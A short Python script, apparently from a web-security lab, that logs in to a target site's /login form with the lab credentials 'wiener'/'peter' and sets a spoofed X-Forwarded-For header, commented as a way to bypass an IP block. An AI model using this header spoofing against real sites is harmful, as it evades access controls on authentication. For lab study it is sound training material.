import requests, sys
from bs4 import BeautifulSoup

# Get the URL of the login form
site = sys.argv[1]                                                         
login_url = f'''{site}/login'''

# Set request headers to bypass IP block
request_headers = {
   'X-Forwarded-For' : f'1.1.1.1'
}

# Create session
s = requests.Session()
resp = s.get(login_url, headers=request_headers)
soup = BeautifulSoup(resp.text,'html.parser')

# Create login form data for given credentials and login
logindata = {
    'username' : 'wiener',
    'password' : 'peter'
}
resp = s.post(login_url, data=logindata, headers=request_headers)

# Print the response and the elapsed time
print(resp.text)
print(f'Response received in {resp.elapsed.total_seconds()}')